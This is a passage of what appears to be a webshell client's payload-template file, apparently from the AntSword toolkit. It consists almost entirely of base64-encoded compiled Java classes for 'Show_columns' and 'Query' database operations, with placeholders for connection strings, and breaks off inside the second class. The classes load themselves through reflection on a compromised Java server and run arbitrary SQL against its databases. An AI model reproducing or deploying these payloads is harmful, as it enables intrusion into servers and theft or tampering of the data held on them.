    _: 'yv66vgAAADEBPQoATACHCQBpAIgJAGkAiQgAigkAaQCLCACMCQBpAI0IAI4JAGkAjwoAaQCQBwCRCgALAIcIAJIIAJMIAJQIAJUIAJYIAJcIAJgIAJkLAEcAmgsARgCbCwBHAJsLAEYAnAoAaQCdCQBpAJ4KAGkAnwoACwCgBwChBwCiCgAeAIcIAKMKAB4ApAoAHQClCgAeAKULAEcApgoACwClCgBpAKcKAKgAqQoAqgCrCgArAKwKACsArQcArgoAaQCvCgArALAIALEKACsAsggAswgAtAoAKwC1CgArALYKAEoAtwgAuAoAuQC6CwC7ALwLAL0AvgsAvwDACwDBAMILAMEAwwsAvwDECwC/AMUIAMYIAMcIAMgIAMkKAGkAygoATADLCgBKAMwHAM0HAM4HAM8IANAIANEHANIKAEoA0wcA1AoA1QDWCADXCABqCgBKANgKANkA2goA2QDbCABsBwDcCADdBwDeCQCqAN8KANUA2goASgDgCgCqAOEKAEoA4goA4wDkCgBMAKUIAOUKAOYA5wgA6AoAKwDpCADqCADrCgBKAOwIAHkIAO0IAO4KAEoA7wcA8AEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAAtzaG93Q29sdW1ucwEAXChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAhhc291dHB1dAEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQARU2hvd19jb2x1bW5zLmphdmEMAHMAdAwAagBrDABsAG0BAAZiYXNlNjQMAG4AbwEAD2FudHN3b3JkQ2hhcnNldAwAcABvAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAHEAbwwAgACBAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgEAAy0+fAEAA3w8LQEAEWFudHN3b3JkYXJnZW5jb2RlAQAPYW50c3dvcmRhcmdjb25uAQANYW50c3dvcmRhcmdkYgEAEGFudHN3b3JkYXJndGFibGUBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPEA8gwA8wDyDAD0AHoMAHkAegwAcgBvDAB+AH8MAPUA9gEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwA9QD3DAD4APkMAPoA+wwAggB6BwD8DAD9APIHAP4MAP8BAAwBAQECDAB3AHgBABBqYXZhL2xhbmcvU3RyaW5nDACDAIQMAHMBAwEAAAwBBAD5AQACDQoBAAEKDAEFAQYMAQcBCAwBCQEKAQATJmNoYXJhY3RlckVuY29kaW5nPQcBCwwBDAENBwEODAEPARAHAREMARIBEwcBFAwBFQEWBwEXDAEYARkMARoBAgwBGwEcDAEdAQIBAAEJAQAOc2VsZWN0ICogZnJvbSABAAEuAQAKIGxpbWl0IDAsMAwAfAB9DAEeAR8MASABHAEAE1tMamF2YS9sYW5nL09iamVjdDsBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAEACmdldFJlcXVlc3QBAA9qYXZhL2xhbmcvQ2xhc3MMASEBIgEAEGphdmEvbGFuZy9PYmplY3QHASMMASQBJQEAC2dldFJlc3BvbnNlDAEmAScHASgMASkBKgwBKwEsAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBLQEuDAEvATAMATEBMgwBMwE0BwE1DAE2ATcBAAxqYXZhLnZlcnNpb24HATgMATkAegEAAzEuOQwBOgEAAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIMATsBIgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMATYBPAEAG2RhdGFiYXNlL215c3FsL1Nob3dfY29sdW1ucwEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBAAxnZXRQYXJhbWV0ZXIBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABHRyaW0BAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAWamF2YS9zcWwvRHJpdmVyTWFuYWdlcgEADWdldENvbm5lY3Rpb24BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NxbC9Db25uZWN0aW9uOwEAE2phdmEvc3FsL0Nvbm5lY3Rpb24BAA9jcmVhdGVTdGF0ZW1lbnQBABYoKUxqYXZhL3NxbC9TdGF0ZW1lbnQ7AQASamF2YS9zcWwvU3RhdGVtZW50AQAMZXhlY3V0ZVF1ZXJ5AQAoKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHaXNBcnJheQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2Vy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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}',
    [arg4]: '#{newbase64::table}'
  },
  query: {
    _: 'yv66vgAAADEBXwoANwCUCQB1AJUJAHUAlggAlwkAdQCYCACZCQB1AJoIAJsJAHUAnAoAdQCdBwCeCgALAJQIAJ8IAKAIAKEIAKIIAKMIAKQIAKULAF4ApgsAXQCnCwBeAKcLAF0AqAoAdQCpCQB1AKoKAHUAqwoACwCsBwCtBwCuCgAdAJQIAK8KAB0AsAoAHACxCgAdALELAF4AsgoACwCxCgB1ALMKALQAtQoAtgC3CgAqALgKACoAuQcAugoAdQC7CgAqALwIAL0KAL4AvwgAwAgAwQoAKgDCCADDCgA1AMQIAMUHAMYKADUAxwcAyAoAyQDKCgA3AMsIAMwHAM0KACoAzggAzwoANQDQCgDRANIIANMIANQKACoA1QoAKgDWCADXCADYCgAqANkKACoA2ggA2woA3ADdCwDeAN8LAOAA4QsA4ADiCwDjAOQLAOUA5gsA5QDnCwDjAOgLAOMA6QoAdQDqCADrCwDgAOwIAO0KAB0A7ggA7wgA8AgA8QoAdQDyCgA1APMHAPQHAPUHAPYIAPcIAPgKADUA+QgA+ggAdgoANQD7CgD8AP0KAPwA/ggAeAcA/wgBAAkAtgEBCgDJAP0KADUBAgoAtgEDCgA1AQQKADcAsQgBBQgAhQgBBggBBwoANQEIBwEJAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAMQmFzZTY0RW5jb2RlAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEABXF1ZXJ5AQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAApRdWVyeS5qYXZhDAB/AIAMAHYAdwwAeAB5AQAGYmFzZTY0DAB6AHsBAA9hbnRzd29yZENoYXJzZXQMAHwAewEAFGFudHN3b3JkcmFuZG9tUHJlZml4DAB9AHsMAI0AjgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADmFudHN3b3JkYXJnc3FsAQASYW50c3dvcmRhcmdkZWNvZGVyAQAJdGV4dC9odG1sDAEKAQsMAQwBCwwBDQCGDACFAIYMAH4AewwAiwCMDAEOAQ8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAlFUlJPUjovLyAMAQ4BEAwBEQESDAETARQMAI8AhgcBFQwBFgELBwEXDAEYARkMARoBGwwAgwCEAQAQamF2YS9sYW5nL1N0cmluZwwAkACRDAB/ARwBAAxqYXZhLnZlcnNpb24HAR0MAR4AhgEAAAEAAzEuOQwBHwEZAQAQamF2YS51dGlsLkJhc2U2NAwBIAEhAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwBIgEjAQAQamF2YS9sYW5nL09iamVjdAcBJAwBJQEmDAEnASgBAA5lbmNvZGVUb1N0cmluZwEAAltCDAEpASoBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAErASwHAS0MAS4BLwEABmVuY29kZQEAAw18CgwBMAExDAEyARIBAAINCgEAAQoMATMBNAwBNQE2AQATJmNoYXJhY3RlckVuY29kaW5nPQcBNwwBOAE5BwE6DAE7ATwHAT0MAT4BPwwBQAFBBwFCDAFDAUQHAUUMAUYBRwwBSAEbDAFJAUoMAUsBGwwAiACGAQAGUmVzdWx0DAFMAUcBAA9Sb3dzIGNoYW5nZWQgPSAMAQ4BTQEALE5vIHJvd3MgY2hhbmdlZCBvciBzdGF0ZW1lbnQgd2FzIERETCBjb21tYW5kAQAFRmFsc2UBAAMJfAkMAIkAigwBTgFKAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0AQAKZ2V0UmVxdWVzdAwBTwEjAQALZ2V0UmVzcG9uc2UMAVABUQcBUgwBUwFUDAFVAVYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwwBVwFYDAFZAVoMAVsBXAwBXQEsAQAKZ2V0RGVjb2RlcgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAS4BXgEAFGRhdGFiYXNlL215c3FsL1F1ZXJ5AQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAApyZXBsYWNlQWxsAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAR0cmltAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAdleGVjdXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAMZ2V0UmVzdWx0U2V0AQAWKClMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAOZ2V0VXBkYXRlQ291bnQBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAHaXNBcnJheQEAEWdldERlY2xhcmVkTWV0aG9kAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAHUANwAAAAYAAQB2AHcAAAABAHgAeQAAAAEAegB7AAAAAQB8AHsAAAABAH0AewAAAAEAfgB7AAAACQABAH8AgAABAIEAAABNAAIAAQAAACEqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACbEAAAABAIIAAAAaAAYAAAAIAAQACQAJAAoADgALABQADAAaAA0AAQCDAIQAAQCBAAABcAAFAAwAAADwKiu2AAq7AAtZtwAMTRINThIOOgQSDzoFEhA6BhIROgcSEjoIKrQAAxITuQAUAgAqtAACKrQAB7kAFQIAKrQAAyq0AAe5ABYCACoqtAACGQW5ABcCALYAGDoJKiq0AAIZBrkAFwIAtgAYOgoqKrQAAhkHuQAXAgC2ABg6CyoqKrQAAhkIuQAXAgC2ABi1ABksKhkJGQoZC7YAGrYAG1enACE6CSy7AB1ZtwAeEh+2ACAZCbYAIbYAILYAIrYAG1cqtAADuQAjAQC7AB1ZtwAeLbYAICostgAktgAltgAgGQS2ACC2ACK2ACanAAU6CQSsAAIAJACeAKEAHAC/AOkA7AAcAAEAggAAAF4AFwAAABIABQATAA0AFAAQABUAFAAWABgAFwAcABgAIAAZACQAHAAvAB0APAAeAEkAHwBaACAAawAhAHwAIgCPACMAngAmAKEAJACjACUAvwAoAOkAKgDsACkA7gArAAAAhQCGAAIAgQAAAHUABAAEAAAANQM9KrQACbgAJz0rHLYAKEynAAZOAz0qtAAFEgS2ACmZABS7ACpZKiu2ACsqtAAHtwAssCuwAAEAAgAQABMAHAABAIIAAAAmAAkAAAAvAAIAMQAKADIAEAA1ABMAMwAUADQAFgA2ACIANwAzADkAhwAAAAQAAQAcAAAAiACGAAEAgQAAAP4ABgAGAAAAqhItuAAuTRIvTiwSMLYAMZsASxIyuAAzOgQZBBI0A70ANbYANhkEA70AN7YAODoFGQW2ADkSOgS9ADVZAxMAO1O2ADYZBQS9ADdZAyu2ADxTtgA4wAAqTqcARBI9uAAzOgQZBAO9ADW2AD4DvQA3tgA/OgUZBbYAORJABL0ANVkDEwA7U7YANhkFBL0AN1kDK7YAPFO2ADjAACpOLRJBEi+2AEJOLbBOEi+wAAEABgClAKYAHAABAIIAAAA6AA4AAAA9AAYAPwAJAEAAEgBBABkAQgAvAEMAVwBEAFoARQBhAEYAcwBHAJsASQCkAEoApgBLAKcATAAAAIkAigACAIEAAAJ7AAQAEQAAAeMSLzoHLLYAQxJEEkW2AEYSRbYARzoIGQgDMrYAQ7gAM1e7AB1ZtwAeGQgEMrYAIBJItgAgK7YAILYAIjoJGQm4AEk6ChkKuQBKAQA6CxkLLbkASwIANgwVDJkA0BkLuQBMAQA6DRkNuQBNAQA6DhUGmQBUBDYPFQ8ZDrkATgEAowAvGQ4VD7kATwIAOhC7AB1ZtwAeGQe2ACAZELYAIBkEtgAgtgAiOgeEDwGn/8u7AB1ZtwAeGQe2ACAZBbYAILYAIjoHGQ25AFABAJkAWwQ2DxUPGQ65AE4BAKMAMxkNFQ+5AFECADoQuwAdWbcAHhkHtgAgKhkQtgBStgAgGQS2ACC2ACI6B4QPAaf/x7sAHVm3AB4ZB7YAIBkFtgAgtgAiOgen/6GnALq7AB1ZtwAeGQe2ACASU7YAIBkEtgAgGQW2ACC2ACI6BxkLuQBUAQA2DRUNngA8uwAdWbcAHhkHtgAgKrsAHVm3AB4SVbYAIBUNtgBWtgAitgBStgAgGQS2ACAZBbYAILYAIjoHpwBTFQ2aACq7AB1ZtwAeGQe2ACAqEle2AFK2ACAZBLYAIBkFtgAgtgAiOgenACe7AB1ZtwAeGQe2ACAqEli2AFK2ACAZBLYAIBkFtgAgtgAiOgcZB7AAAAABAIIAAACGACEAAABSAAQAUwAWAFQAIQBVAD0AVgBEAFcATQBYAFcAWQBcAFoAZQBbAG4AXQBzAF4AggBfAI0AYACoAF4ArgBiAMQAZQDOAGYA3QBnAOgAaAEHAGYBDQBqASMAawEmAGwBKQBtAUkAbgFSAG8BVwBwAY0AcQGVAHIBuQBzAbwAdAHgAHcAhwAAAAQAAQAcAAAAiwCMAAIAgQAAADUABwAGAAAAFRJZOgQSRDoFKissLRkEGQUEtgBasAAAAAEAggAAAA4AAwAAAHsABAB8AAgAfQCHAAAABAABABwAAQCNAI4AAQCBAAABaAAEAAYAAADcK7YAObYAW5kAIivAAFzAAFxNKiwDMsAAXbUAAiosBDLAAF61AAOnALUSX7gAM00qLBJgA70ANbYAYSsDvQA3tg